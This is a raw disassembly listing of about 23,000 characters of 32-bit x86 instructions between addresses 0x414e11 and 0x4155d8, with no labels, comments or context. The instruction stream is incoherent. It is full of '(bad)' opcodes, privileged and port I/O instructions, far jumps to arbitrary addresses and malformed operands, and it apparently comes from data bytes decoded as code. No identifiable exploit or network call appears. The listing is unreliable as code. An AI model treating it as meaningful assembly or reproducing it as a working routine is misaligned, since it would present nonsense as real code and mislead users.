  414e11:	mov    edi,0x52689794
  414e16:	aam    0x31
  414e18:	outs   dx,DWORD PTR ds:[esi]
  414e19:	cs or  al,ah
  414e1c:	bnd jae 0x414e2b
  414e1f:	add    BYTE PTR [edx+0x70],ch
  414e22:	cwde   
  414e23:	and    BYTE PTR ds:0x7df7efa0,dl
  414e29:	and    al,0xb2
  414e2b:	jecxz  0x414db1
  414e2d:	popf   
  414e2e:	sub    eax,0x26282df3
  414e33:	sbb    DWORD PTR [edx],esp
  414e35:	retf   
  414e36:	or     DWORD PTR [eax-0x35],eax
  414e39:	mov    ch,0xf5
  414e3b:	dec    edx
  414e3c:	daa    
  414e3d:	xor    edx,DWORD PTR [esi]
  414e3f:	pop    edx
  414e40:	add    BYTE PTR [esi],dl
  414e42:	jne    0x414e83
  414e44:	and    DWORD PTR [ebp+edx*4+0x78ee34bb],0xffffff87
  414e4c:	fisttp DWORD PTR [edx]
  414e4e:	sub    al,cl
  414e50:	test   al,0x94
  414e52:	mov    bl,ah
  414e54:	retf   
  414e55:	push   ebp
  414e56:	jo     0x414e9f
  414e58:	mov    esp,0x1cd813c2
  414e5d:	mov    ds:0x37844154,eax
  414e62:	inc    esi
  414e63:	fs leave 
  414e65:	scas   eax,DWORD PTR es:[edi]
  414e66:	cli    
  414e67:	adc    bh,ah
  414e69:	add    esi,DWORD PTR ds:0xb67cc1da
  414e6f:	sbb    bl,BYTE PTR [esp+ebp*4]
  414e72:	jmp    0x414edf
  414e74:	sbb    eax,0x8213979b
  414e79:	and    BYTE PTR [esi+0x69],ah
  414e7c:	mov    ebp,0xec2d6213
  414e81:	iret   
  414e82:	cmp    al,dh
  414e84:	gs in  eax,0xe4
  414e87:	iret   
  414e88:	mov    BYTE PTR [eax+0x57],dh
  414e8b:	test   ax,0xd972
  414e8f:	mov    ds:0x92dacdc5,eax
  414e94:	scas   al,BYTE PTR es:[edi]
  414e95:	add    al,0x5b
  414e97:	shl    BYTE PTR [edx+esi*1],1
  414e9a:	mov    edx,DWORD PTR [ecx+eax*1]
  414e9d:	push   0xd0d7331e
  414ea2:	mov    ds:0x10e1d0a4,al
  414ea7:	sti    
  414ea8:	push   cs
  414ea9:	ja     0x414ec6
  414eab:	cmp    eax,0x210464d3
  414eb0:	inc    ebp
  414eb1:	or     ecx,DWORD PTR [edx-0x4e9e77bb]
  414eb7:	xchg   esi,eax
  414eb8:	aam    0xf1
  414eba:	fidiv  DWORD PTR [esi+0x26]
  414ebd:	xchg   ebx,eax
  414ebe:	sub    al,0xfc
  414ec0:	in     al,0x1c
  414ec2:	add    dh,ah
  414ec4:	cmp    BYTE PTR [ebx],0x50
  414ec7:	or     dh,BYTE PTR [ecx-0x6601a668]
  414ecd:	je     0x414e84
  414ecf:	mov    eax,0xd533c743
  414ed4:	xlat   BYTE PTR ds:[ebx]
  414ed5:	mov    BYTE PTR [ebp-0x348a8e37],ch
  414edb:	addr16 stc 
  414edd:	(bad)  
  414edf:	data16 data16 fsub st,st(5)
  414ee3:	add    cl,BYTE PTR [eax-0x26299e71]
  414ee9:	and    DWORD PTR [eax-0x76a7b50f],ebp
  414eef:	and    DWORD PTR [eax],ebp
  414ef1:	lods   al,BYTE PTR ds:[esi]
  414ef2:	pop    edi
  414ef3:	push   ecx
  414ef4:	aam    0xf6
  414ef6:	jo     0x414ebd
  414ef8:	mov    dl,0xb4
  414efa:	inc    edx
  414efb:	jmp    0x414e9a
  414efd:	ins    BYTE PTR es:[edi],dx
  414efe:	xchg   BYTE PTR [edx],dh
  414f00:	sahf   
  414f01:	jb     0x414ebb
  414f03:	mov    es,WORD PTR [ebx]
  414f05:	and    BYTE PTR [eax-0x66],bh
  414f08:	or     dl,0xe0
  414f0b:	out    0x2c,eax
  414f0d:	and    BYTE PTR [ecx+0x4],0x8f
  414f11:	or     BYTE PTR [eax-0x2bd8935a],bh
  414f17:	leave  
  414f18:	mov    cl,0x69
  414f1a:	adc    al,0x25
  414f1c:	dec    esi
  414f1d:	sub    BYTE PTR [edx],dl
  414f1f:	mov    cl,0x6b
  414f21:	cmp    esp,esi
  414f23:	adc    ah,cl
  414f25:	loope  0x414f0e
  414f27:	pop    esp
  414f28:	je     0x414f9b
  414f2a:	(bad)  
  414f2b:	lock or edx,DWORD PTR [eax-0x1b]
  414f2f:	cs retf 
  414f31:	sahf   
  414f32:	out    dx,al
  414f33:	push   edx
  414f34:	call   0x4453375
  414f39:	ja     0x414f98
  414f3b:	mov    ebp,0x4dc78aa1
  414f40:	cdq    
  414f41:	ins    BYTE PTR es:[edi],dx
  414f42:	pop    ds
  414f43:	dec    esi
  414f44:	push   eax
  414f45:	daa    
  414f46:	dec    esi
  414f47:	adc    edx,DWORD PTR [ebx+0x735490fe]
  414f4d:	add    BYTE PTR [esi],dh
  414f4f:	out    0x4d,al
  414f51:	xchg   edx,eax
  414f53:	and    edx,DWORD PTR [esp+ecx*8-0x48a36b28]
  414f5a:	mov    al,ds:0xf8aae66c
  414f5f:	mov    ebx,0xfb468d10
  414f64:	dec    esp
  414f65:	dec    ebp
  414f66:	cs nop
  414f68:	sahf   
  414f69:	xor    dh,cl
  414f6b:	shl    bh,0x2f
  414f6e:	adc    dl,BYTE PTR [edi+esi*8-0x23]
  414f72:	xchg   esi,eax
  414f73:	and    BYTE PTR [edi+0x5d],0x9
  414f77:	or     al,0xb5
  414f79:	inc    eax
  414f7a:	inc    esp
  414f7b:	and    ecx,DWORD PTR [ebp-0x7dbf4b2b]
  414f81:	ds inc ecx
  414f83:	mov    ecx,ebp
  414f85:	jne    0x414f49
  414f87:	mov    edi,0x2c99581
  414f8c:	sbb    ecx,esp
  414f8e:	adc    eax,0xa8981439
  414f93:	ins    BYTE PTR es:[edi],dx
  414f94:	or     BYTE PTR [esp+ebp*1-0xb],ch
  414f98:	sahf   
  414f99:	fistp  WORD PTR [ecx]
  414f9b:	not    BYTE PTR [edx]
  414f9d:	pop    es
  414f9e:	xchg   ebx,eax
  414f9f:	mov    ebp,0x4ebe78d4
  414fa4:	mov    dh,0x49
  414fa6:	stos   DWORD PTR es:[edi],eax
  414fa7:	pop    es
  414fa8:	int    0x2
  414faa:	sbb    BYTE PTR [ebx+0x73],ah
  414fad:	xchg   ebp,eax
  414fae:	imul   eax,DWORD PTR [esi],0xb01a1e18
  414fb4:	xchg   ebp,eax
  414fb5:	fbld   TBYTE PTR [eax-0xf]
  414fb8:	(bad)  
  414fb9:	push   ds
  414fba:	enter  0x19c0,0xb6
  414fbe:	jmp    0x238fe58c
  414fc3:	inc    esp
  414fc4:	inc    edi
  414fc5:	inc    ebx
  414fc6:	sbb    BYTE PTR [eax+0x51eabad1],ch
  414fcc:	test   edx,ecx
  414fce:	sub    BYTE PTR ds:0x49ece421,bl
  414fd4:	imul   edi,ebx,0xc7de5595
  414fda:	adc    al,0xcf
  414fdc:	int3   
  414fdd:	out    0x6d,al
  414fdf:	test   DWORD PTR [edi-0x33],eax
  414fe2:	fidivr DWORD PTR [ecx]
  414fe4:	test   al,0xa3
  414fe6:	retf   0xc7f7
  414fe9:	sbb    cx,WORD PTR [edi-0x3dfb2420]
  414ff0:	and    edx,ecx
  414ff2:	fst    QWORD PTR [ecx]
  414ff4:	(bad)
  414ff7:	mov    ds:0xccebc6fe,al
  414ffc:	std    
  414ffd:	push   eax
  414ffe:	and    ecx,DWORD PTR [eax+0x64b9fbbd]
  415004:	ja     0x415030
  415006:	push   ebp
  415007:	xchg   ecx,eax
  415008:	loope  0x414fc4
  41500a:	je     0x414fea
  41500c:	and    ecx,esi
  41500e:	jno    0x41505d
  415010:	inc    eax
  415011:	xor    DWORD PTR [ebx-0x12],ecx
  415014:	dec    esp
  415015:	pusha  
  415016:	lds    ebx,FWORD PTR [ebp-0x36f54e3f]
  41501c:	jno    0x415010
  41501e:	and    ch,BYTE PTR [esp+edi*2-0x5e]
  415022:	dec    BYTE PTR [ebx]
  415024:	out    dx,eax
  415025:	mov    ?,WORD PTR [esi-0x6a]
  415028:	mov    eax,0x7b17f72f
  41502d:	mov    edx,0x7da03836
  415032:	push   ebx
  415033:	xor    BYTE PTR [ebp-0x44978f9f],0x99
  41503a:	push   ebp
  41503b:	aas    
  41503c:	scas   eax,DWORD PTR es:[edi]
  41503d:	(bad)  
  41503e:	es in  eax,dx
  415040:	(bad)  
  415041:	xchg   esp,eax
  415042:	stc    
  415043:	pop    edx
  415044:	or     eax,0x87f1ddc
  415049:	pop    ds
  41504a:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41504c:	pop    ebp
  41504d:	dec    eax
  41504e:	cmc    
  41504f:	jmp    0xd59f:0x81b514e3
  415056:	int3   
  415057:	mov    ah,BYTE PTR [ebx+0x609aeb23]
  41505d:	push   ecx
  41505e:	mov    esp,0x70505e6b
  415063:	pop    esp
  415064:	jl     0x4150a6
  415066:	pop    ss
  415067:	dec    ecx
  415068:	xchg   BYTE PTR [ecx+0x494d0cbd],al
  41506e:	mov    bl,BYTE PTR [ebx]
  415070:	cmp    eax,DWORD PTR [ecx]
  415072:	jnp    0x41504a
  415074:	cmp    BYTE PTR [esi-0x37],al
  415077:	loope  0x41501e
  415079:	mov    ds:0x473e845a,al
  41507e:	loopne 0x4150d0
  415080:	fs cmp BYTE PTR gs:[edi+0x72],0xaf
  415086:	xchg   edx,eax
  415087:	test   bl,cl
  415089:	push   DWORD PTR [edi+0x12]
  41508c:	mov    ebx,0xcce23d3e
  415091:	cld    
  415092:	in     al,0x87
  415094:	icebp  
  415095:	(bad)  [edi+0x6c]
  415098:	aas    
  415099:	and    dl,BYTE PTR [eax]
  41509b:	inc    ecx
  41509c:	int    0x66
  41509e:	and    ch,cl
  4150a0:	xchg   esp,eax
  4150a1:	lods   al,BYTE PTR ds:[esi]
  4150a2:	and    DWORD PTR ds:0xea15644f,eax
  4150a8:	jnp    0x41503d
  4150aa:	xor    ebx,eax
  4150ac:	test   DWORD PTR [edi-0x2a3b0150],edi
  4150b2:	mov    DWORD PTR [esi+ecx*8+0x3],ebx
  4150b6:	cmp    al,0x63
  4150b8:	iret   
  4150b9:	sbb    al,0x1a
  4150bb:	xchg   edi,eax
  4150bc:	mov    WORD PTR [esp+ecx*8-0xafafeb0],ds
  4150c3:	lea    esp,[ebx]
  4150c5:	jbe    0x4150d8
  4150c7:	or     DWORD PTR [ecx+0x16],eax
  4150ca:	sub    BYTE PTR [edi+0x3f41d510],cl
  4150d0:	lds    ebx,FWORD PTR [edi-0x2d]
  4150d3:	cmp    edx,DWORD PTR [eax+eax*4]
  4150d6:	dec    ebp
  4150d7:	enter  0x8aa,0xbc
  4150db:	dec    edx
  4150dc:	or     al,0x4b
  4150de:	stc    
  4150df:	scas   al,BYTE PTR es:[edi]
  4150e0:	and    BYTE PTR [esi+0x31],0x82
  4150e4:	mov    al,ds:0x56cd1a9e
  4150e9:	ja     0x4150e1
  4150eb:	(bad)  
  4150ec:	cdq    
  4150ed:	add    DWORD PTR [esi+0x15],esi
  4150f0:	adc    bh,BYTE PTR [edi]
  4150f2:	rol    ebx,1
  4150f4:	adc    ebp,DWORD PTR [ecx]
  4150f6:	xchg   esi,eax
  4150f7:	daa    
  4150f8:	xor    ch,bl
  4150fa:	add    eax,0x99efa0f4
  4150ff:	cwde   
  415100:	(bad)  
  415101:	call   0x9a0173a1
  415106:	fcom   DWORD PTR gs:[ebp-0x2f400251]
  41510d:	pop    edi
  41510e:	jecxz  0x415145
  415110:	pop    edi
  415111:	leave  
  415112:	and    al,0xb6
  415114:	int3   
  415115:	scas   al,BYTE PTR es:[edi]
  415116:	and    al,0x9d
  415118:	xor    al,0x7f
  41511a:	mov    ebx,0x39871530
  41511f:	ficom  DWORD PTR [ebp-0x3]
  415122:	xchg   edx,eax
  415123:	addr16 js 0x415157
  415126:	icebp  
  415127:	popf   
  415128:	ret    
  415129:	mov    al,ds:0x93b9b53c
  41512e:	call   0x321c2a89
  415133:	lods   al,BYTE PTR ds:[esi]
  415134:	mov    bh,BYTE PTR [edi-0x690f1a2f]
  41513a:	mov    dl,0x83
  41513c:	xchg   edx,eax
  41513d:	in     eax,0xba
  41513f:	jb     0x4150fc
  415141:	dec    ecx
  415142:	jl     0x4151b5
  415144:	jmp    0x415117
  415146:	jnp    0x4150dd
  415148:	adc    ecx,ebp
  41514a:	fcom   QWORD PTR [eax]
  41514c:	mov    edx,0xd181b7f8
  415151:	scas   eax,DWORD PTR es:[edi]
  415152:	lods   al,BYTE PTR ds:[esi]
  415153:	xor    al,0x3c
  415155:	ss mov cl,al
  415158:	inc    edx
  415159:	ds mov al,0x10
  41515c:	and    ah,dl
  41515e:	cmc    
  41515f:	in     al,dx
  415160:	xchg   ebp,eax
  415161:	or     ah,BYTE PTR [ebp+0x5716e23e]
  415167:	or     BYTE PTR [edx+0x6c638056],0x70
  41516e:	adc    DWORD PTR [eax],eax
  415170:	xor    al,0x6c
  415172:	push   0xf0014118
  415177:	or     esp,DWORD PTR [ecx+0x31a395fe]
  41517d:	jge    0x4151d7
  41517f:	rol    DWORD PTR [eax-0x1c],0xf3
  415183:	cs pop ebp
  415185:	fld    st(7)
  415187:	daa    
  415188:	loopne 0x4151ee
  41518a:	les    edx,FWORD PTR [eax+0x64]
  41518d:	adc    BYTE PTR [ecx],ah
  41518f:	(bad)  
  415190:	sbb    al,0x11
  415192:	ins    BYTE PTR es:[edi],dx
  415193:	retf   0xfba8
  415196:	data16 mov BYTE PTR [esi],al
  415199:	pop    ecx
  41519a:	(bad)  
  41519b:	loopne 0x41519e
  41519d:	jle    0x4151b4
  41519f:	sar    ebp,0xcb
  4151a2:	cwde   
  4151a3:	pop    edi
  4151a4:	mov    ch,0x20
  4151a6:	rcl    DWORD PTR [ebx-0x443d7558],1
  4151ac:	mov    BYTE PTR [esi-0x9eea07c],ch
  4151b2:	sbb    dh,BYTE PTR [edi]
  4151b4:	xchg   ebx,eax
  4151b5:	imul   eax,edi,0x1
  4151b8:	mov    ah,0x1
  4151ba:	sub    al,BYTE PTR [ecx]
  4151bc:	sar    BYTE PTR [edi+0xe],1
  4151bf:	aam    0x88
  4151c1:	les    edi,FWORD PTR [eax-0x52]
  4151c4:	into   
  4151c5:	pushf  
  4151c6:	mov    esi,0xf9d6c838
  4151cb:	cmp    al,0x4c
  4151cd:	and    bh,BYTE PTR [esi]
  4151cf:	cmp    al,0xab
  4151d1:	adc    ch,cl
  4151d3:	sub    BYTE PTR [edi-0x26],bh
  4151d6:	sbb    BYTE PTR [ecx],cl
  4151d8:	jns    0x415232
  4151da:	outs   dx,DWORD PTR ds:[esi]
  4151db:	fldcw  WORD PTR [ebx-0x57]
  4151de:	scas   al,BYTE PTR es:[edi]
  4151df:	shr    DWORD PTR [ebx+0x13],0xda
  4151e3:	idiv   DWORD PTR [ecx+0x658a3653]
  4151e9:	data16 or dl,bh
  4151ec:	push   edi
  4151ed:	jns    0x4151bf
  4151ef:	sub    al,0x89
  4151f1:	fadd   DWORD PTR [edx-0x50f43147]
  4151f7:	and    al,0xbd
  4151fa:	icebp  
  4151fb:	test   BYTE PTR [eax],cl
  4151fd:	es iret 
  4151ff:	jb     0x4151e4
  415201:	adc    eax,0x203fa886
  415206:	repz pop ebp
  415208:	mov    ah,0x52
  41520a:	jecxz  0x41519b
  41520c:	push   0x57ade148
  415211:	repnz test al,0x32
  415214:	xchg   DWORD PTR [edi+eiz*2+0x6e],ecx
  415218:	and    al,0x8e
  41521a:	and    DWORD PTR [ebp-0x895ef94],ebx
  415220:	add    BYTE PTR [esi-0xc],dl
  415223:	(bad)
  415227:	daa    
  415228:	or     DWORD PTR [esi],edx
  41522a:	cld    
  41522b:	aas    
  41522c:	das    
  41522d:	and    DWORD PTR [edx],ecx
  41522f:	ja     0x415227
  415231:	scas   al,BYTE PTR es:[edi]
  415232:	pop    esp
  415233:	mov    edx,0x9914d8f1
  415238:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415239:	or     BYTE PTR [edx],dh
  41523b:	lods   eax,DWORD PTR ds:[esi]
  41523c:	dec    ebx
  41523d:	push   esp
  41523e:	ja     0x4152a6
  415240:	rcr    BYTE PTR [esp+esi*8-0xb71227f],cl
  415247:	or     dh,BYTE PTR [ecx]
  415249:	fidivr WORD PTR ds:0x71c387ab
  415250:	sub    eax,DWORD PTR [esp+eax*1]
  415253:	adc    DWORD PTR [esi-0x18318c9e],esp
  415259:	les    esp,FWORD PTR [esi]
  41525b:	in     al,0xb1
  41525d:	sar    ah,1
  41525f:	jge    0x41526c
  415261:	pusha  
  415262:	nop    DWORD PTR [edi]
  415265:	or     bl,0x9d
  415268:	stos   DWORD PTR es:[edi],eax
  415269:	xor    DWORD PTR es:[ecx+0x7907bc62],eax
  415270:	call   0x2b68:0x4779c128
  415277:	sub    eax,0xf7cd0397
  41527c:	hlt    
  41527d:	mov    ds:0xb1c451f9,al
  415282:	cmp    ebx,DWORD PTR [ebx]
  415284:	pop    ss
  415285:	mov    ds:0xf37a7a72,al
  41528a:	lock pop edx
  41528c:	cld    
  41528d:	test   bl,cl
  41528f:	fdiv   st,st(0)
  415291:	inc    esi
  415292:	pop    ss
  415293:	imul   esi,DWORD PTR [ecx+0x5ffa5773],0xc057fd3b
  41529d:	xchg   ebx,eax
  41529e:	lock in eax,dx
  4152a0:	enter  0x674,0x6a
  4152a4:	push   0xfffffff5
  4152a6:	push   ds
  4152a7:	test   DWORD PTR [ebx-0x4b],ebp
  4152aa:	mov    edx,0x8071d8a8
  4152af:	lea    ecx,[esi]
  4152b1:	mov    ds:0xb07ed09e,eax
  4152b6:	ret    
  4152b7:	mov    esp,ecx
  4152b9:	rol    DWORD PTR [esi-0x59],cl
  4152bc:	(bad)  [eax]
  4152be:	sti    
  4152bf:	inc    eax
  4152c0:	push   esi
  4152c1:	mov    bl,0x69
  4152c3:	or     bl,bh
  4152c5:	in     al,dx
  4152c6:	pop    edx
  4152c7:	fisubr DWORD PTR [ebp-0x1b]
  4152ca:	add    esp,DWORD PTR [edi-0x48]
  4152cd:	(bad)  
  4152ce:	jmp    0xba63:0xce6f7ce5
  4152d5:	loope  0x41526a
  4152d7:	outs   dx,DWORD PTR ds:[esi]
  4152d8:	mov    ds:0xfe78644a,eax
  4152dd:	add    al,BYTE PTR [eax]
  4152df:	sti    
  4152e0:	inc    edi
  4152e1:	shl    DWORD PTR [edx-0x3b],cl
  4152e4:	sbb    eax,0x33a7286
  4152e9:	mov    cl,dh
  4152eb:	pop    esi
  4152ec:	or     eax,0xf4900e8a
  4152f1:	cli    
  4152f2:	retf   
  4152f3:	outs   dx,BYTE PTR ds:[esi]
  4152f4:	pop    edx
  4152f5:	je     0x415291
  4152f7:	out    0xf7,al
  4152f9:	adc    BYTE PTR [ecx],al
  4152fb:	out    dx,al
  4152fc:	push   es
  4152fd:	sub    al,BYTE PTR [edi+0x38d980f0]
  415303:	xchg   ebx,eax
  415304:	mov    al,ds:0xcbb023e
  415309:	pop    edx
  41530a:	mov    esp,0x66c1a7f1
  41530f:	and    DWORD PTR [esi+0x148a6e4b],0xe37803df
  415319:	in     al,0xd1
  41531b:	xchg   eax,eax
  41531d:	jae    0x41537e
  41531f:	outs   dx,BYTE PTR ds:[esi]
  415320:	(bad)  
  415321:	rol    BYTE PTR [eax],cl
  415323:	lds    esp,FWORD PTR ds:0xbf72eed8
  415329:	and    esp,DWORD PTR [eax+0x4b]
  41532c:	repnz fldcw WORD PTR [eax]
  41532f:	add    DWORD PTR [esi-0x34],eax
  415332:	enter  0xdaec,0x93
  415336:	inc    ebx
  415337:	pop    bp
  415339:	jp     0x4152e9
  41533b:	or     eax,0x5a54edfc
  415340:	(bad)  
  415341:	dec    esi
  415342:	xor    eax,DWORD PTR ds:0xa16d74bb
  415348:	(bad)  
  415349:	rcr    al,1
  41534b:	xor    dl,BYTE PTR [ebx]
  41534d:	sub    DWORD PTR [esi-0x1c],esi
  415350:	les    ecx,FWORD PTR [esi]
  415352:	mov    bh,0xaf
  415354:	mov    ah,0xb2
  415356:	je     0x415341
  415358:	mov    WORD PTR [ecx],?
  41535a:	aam    0xec
  41535c:	out    0xb7,eax
  41535e:	out    dx,eax
  41535f:	mov    dl,0xf1
  415361:	adc    BYTE PTR [ebp-0x7ca547d7],bl
  415367:	shl    DWORD PTR [edx+eiz*1+0x18],1
  41536b:	jge    0x415387
  41536d:	jp     0x4153b2
  41536f:	push   ebx
  415370:	push   cs
  415371:	sbb    eax,0x882b8976
  415376:	stc    
  415377:	test   al,dh
  415379:	push   0x1f
  41537b:	pushf  
  41537c:	dec    esi
  41537d:	sub    al,0x28
  41537f:	and    eax,0x3a1f0b1b
  415384:	aaa    
  415385:	and    BYTE PTR [edi-0x6a],dh
  415388:	cwde   
  415389:	loopne 0x415383
  41538b:	adc    cl,BYTE PTR ds:0x93147178
  415391:	repnz add ebp,DWORD PTR [eax]
  415394:	ret    0xc8a6
  415397:	mov    al,0x40
  415399:	mov    al,ds:0x504dedb
  41539e:	fistp  WORD PTR [esp+ecx*1-0x7e0adcbd]
  4153a5:	or     edx,DWORD PTR [esi*8+0x10db436f]
  4153ac:	std    
  4153ad:	mov    esp,0x1a8b2677
  4153b2:	cld    
  4153b3:	popf   
  4153b4:	out    dx,al
  4153b5:	cmp    edi,ecx
  4153b7:	push   ebp
  4153b8:	(bad)  
  4153b9:	pop    ebp
  4153ba:	lods   al,BYTE PTR ds:[esi]
  4153bb:	or     al,0x53
  4153bd:	mov    ebp,0x290c892b
  4153c2:	lahf   
  4153c3:	(bad)  
  4153c4:	(bad)  
  4153c5:	data16 fsub DWORD PTR [edi]
  4153c8:	pop    ebx
  4153c9:	pop    ebp
  4153ca:	adc    BYTE PTR [ecx+0x3c7dae0],ah
  4153d0:	and    al,0xb5
  4153d2:	mov    DWORD PTR [edx+0x26],eax
  4153d5:	ret    0x1594
  4153d8:	loopne 0x415402
  4153da:	ins    DWORD PTR es:[edi],dx
  4153db:	clc    
  4153dc:	pop    edi
  4153dd:	push   ebp
  4153de:	xor    al,0x9
  4153e0:	mov    ecx,0xbdcfd850
  4153e5:	or     al,0x3c
  4153e7:	fisttp DWORD PTR [eax]
  4153e9:	ins    DWORD PTR es:[edi],dx
  4153ea:	pop    es
  4153eb:	in     al,0xe4
  4153ed:	push   edx
  4153ee:	lods   eax,DWORD PTR ds:[esi]
  4153ef:	jne    0x415412
  4153f1:	rol    BYTE PTR [ebx],0x77
  4153f4:	jno    0x4153a8
  4153f6:	xor    BYTE PTR [ecx],cl
  4153f8:	mov    dl,0x11
  4153fa:	fmulp  st(4),st
  4153fc:	addr16 rcr edx,cl
  4153ff:	xor    BYTE PTR [esp+ebp*1-0x26],al
  415403:	push   edi
  415404:	push   ss
  415405:	repnz retf 
  415407:	mov    ds,eax
  415409:	jp     0x4153f9
  41540b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41540c:	loope  0x41544c
  41540e:	inc    ecx
  41540f:	sbb    esi,DWORD PTR [ebp+0x3e]
  415412:	mov    bl,BYTE PTR [eax-0x2a]
  415415:	outs   dx,DWORD PTR ds:[esi]
  415416:	sti    
  415417:	adc    DWORD PTR [ecx+0x6a2945f4],ecx
  41541d:	xor    dh,bl
  41541f:	sub    al,ch
  415421:	scas   al,BYTE PTR es:[edi]
  415422:	test   ebp,edx
  415424:	add    al,0x67
  415426:	mov    esp,0x376bfa09
  41542b:	cmp    BYTE PTR ds:[ebx],0xfb
  41542f:	ret    0x451e
  415432:	not    DWORD PTR [ecx+0x5f]
  415435:	clc    
  415436:	push   esp
  415437:	into   
  415438:	cmp    al,0xe2
  41543a:	imul   ebp,DWORD PTR [eax-0x3],0xfffffff4
  41543e:	push   eax
  41543f:	add    eax,0x5e4eab1e
  415444:	or     DWORD PTR [edx-0x127ce018],esi
  41544a:	out    0xa6,al
  41544c:	lahf   
  41544d:	sbb    cl,BYTE PTR [esp+eiz*8]
  415450:	or     al,0x84
  415452:	jo     0x4153e4
  415454:	(bad)  
  415456:	inc    ebp
  415457:	mov    fs,WORD PTR [esp+edi*8]
  41545a:	jnp    0x4154a7
  41545c:	mov    esp,0x9414c9af
  415461:	outs   dx,BYTE PTR ds:[esi]
  415462:	leave  
  415463:	xor    al,0xc0
  415465:	jo     0x415470
  415467:	push   ss
  415468:	cs sti 
  41546a:	mov    BYTE PTR [eax-0x395d0095],ah
  415470:	adc    BYTE PTR [eax+0x12],bl
  415473:	xchg   DWORD PTR [esi+0x44541fe1],ebx
  415479:	lea    edi,[ecx]
  41547b:	rol    BYTE PTR [edi-0x41451fb3],0xfa
  415482:	sahf   
  415483:	mov    ah,0xca
  415485:	es jns 0x41541f
  415488:	loopne 0x415497
  41548a:	pop    esi
  41548b:	jbe    0x4154cc
  41548d:	loope  0x415492
  41548f:	(bad)  
  415490:	ja     0x41544f
  415492:	rcl    BYTE PTR [eax],cl
  415494:	xchg   edi,eax
  415495:	pop    eax
  415496:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415497:	sbb    edi,DWORD PTR [eax+ecx*1-0x15]
  41549b:	mov    esi,0x3c6cd36b
  4154a0:	fistp  WORD PTR [edi+0x6c]
  4154a3:	ss add eax,0xd3a012f0
  4154a9:	cdq    
  4154aa:	jg     0x415462
  4154ac:	or     esi,DWORD PTR [ebp+0x3b043a08]
  4154b2:	jns    0x41552b
  4154b4:	arpl   si,cx
  4154b6:	inc    ebx
  4154b7:	adc    esi,edx
  4154b9:	daa    
  4154ba:	and    al,0xf6
  4154bc:	push   esp
  4154bd:	sbb    eax,0xbac4f5cc
  4154c2:	(bad)  [edi+0x2e]
  4154c5:	out    dx,al
  4154c6:	dec    ebp
  4154c7:	and    BYTE PTR [ebx],dh
  4154c9:	xchg   esi,eax
  4154ca:	mov    ebx,0xef51fe2c
  4154cf:	xchg   esp,eax
  4154d0:	push   ebp
  4154d1:	adc    cl,BYTE PTR [ebp-0x46213fb]
  4154d7:	setae  BYTE PTR ds:0x5c730095
  4154de:	jmp    0x41554f
  4154e0:	test   BYTE PTR [edi-0x2],dl
  4154e3:	pushf  
  4154e4:	dec    edi
  4154e5:	pushf  
  4154e6:	out    dx,eax
  4154e7:	mov    ah,0x45
  4154e9:	sub    al,BYTE PTR [edi]
  4154eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154ec:	xchg   edx,eax
  4154ed:	sbb    BYTE PTR [ecx+0x4eaefdc5],bl
  4154f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154f4:	pop    ds
  4154f5:	mov    dl,0x49
  4154f7:	mov    BYTE PTR [edi],dl
  4154f9:	cmp    eax,DWORD PTR [edi+0x57]
  4154fc:	jge    0x415536
  4154fe:	xor    DWORD PTR [ebp-0x3b],esi
  415501:	mov    ebp,0x96e084f3
  415506:	fiadd  WORD PTR [edi-0x5b8a7e06]
  41550c:	adc    bh,BYTE PTR [edi]
  41550e:	rcr    BYTE PTR [esi],0xb5
  415511:	fisub  WORD PTR [ebx]
  415513:	and    bh,dl
  415515:	pop    es
  415516:	sar    DWORD PTR [esi-0x73],0x6e
  41551a:	(bad)  
  41551b:	dec    ebp
  41551c:	dec    edi
  41551d:	cwde   
  41551e:	mov    DWORD PTR [esi-0xdef2215],esi
  415524:	out    dx,eax
  415525:	push   es
  415526:	fsubr  DWORD PTR [eax]
  415528:	stos   BYTE PTR es:[edi],al
  415529:	jb     0x4154ac
  41552b:	add    bh,cl
  41552d:	retf   0x2bb5
  415530:	aas    
  415531:	scas   eax,DWORD PTR es:[edi]
  415532:	pop    es
  415533:	iret   
  415534:	mov    esi,0x1b13c9fb
  415539:	test   WORD PTR [edi+0x71],ax
  41553d:	mov    ebx,0xb1dc673d
  415542:	jle    0x4154f5
  415544:	jmp    0x16d3bf4c
  415549:	mov    bh,0xa3
  41554b:	stos   BYTE PTR es:[edi],al
  41554c:	pop    esi
  41554d:	pop    eax
  41554e:	or     DWORD PTR [ebx+eiz*1-0x1c2721d9],ecx
  415555:	adc    bh,BYTE PTR [edx+0x45822ecc]
  41555b:	sub    eax,DWORD PTR [edx+ecx*2-0x1466aa32]
  415562:	jle    0x4155dc
  415564:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415565:	dec    esi
  415566:	mov    edx,0x22c3282b
  41556b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41556c:	call   0x47e8c48b
  415571:	out    0x80,eax
  415573:	push   ebx
  415574:	pushf  
  415575:	cmp    dl,bl
  415577:	push   0x34c3e269
  41557c:	adc    eax,0xe0261ed3
  415581:	(bad)  [eax]
  415583:	sbb    DWORD PTR [edx+esi*8],0xc1a88dd7
  41558a:	cwde   
  41558b:	jecxz  0x41559a
  41558d:	mov    WORD PTR [edx+0x22],?
  415590:	(bad)  
  415591:	mov    al,ds:0x8f96b99a
  415596:	or     BYTE PTR [edi+0x6160eb2f],ah
  41559c:	mov    ecx,0x70f49426
  4155a1:	in     al,0xfc
  4155a3:	bound  ebx,QWORD PTR [ebx-0x60]
  4155a6:	in     al,0xf3
  4155a8:	adc    ch,0x79
  4155ab:	add    esp,DWORD PTR [ecx+0x42]
  4155ae:	jmp    DWORD PTR [ebx+0x4cc5c27b]
  4155b4:	clc    
  4155b5:	addr16 cld 
  4155b7:	bound  eax,QWORD PTR [esi-0x65b5df6b]
  4155bd:	mov    esp,0x1cb13b61
  4155c2:	mov    ds:0xaffbab96,eax
  4155c7:	mov    al,BYTE PTR [ebx]
  4155c9:	test   BYTE PTR [esp+eax*2],bh
  4155cc:	fnsave [esi+eiz*4]
  4155cf:	adc    BYTE PTR [ebx],al
  4155d1:	ret    0x9457
  4155d4:	sbb    al,0x4
  4155d6:	mov    cl,BYTE PTR [ecx]
  4155d8:	dec    edx
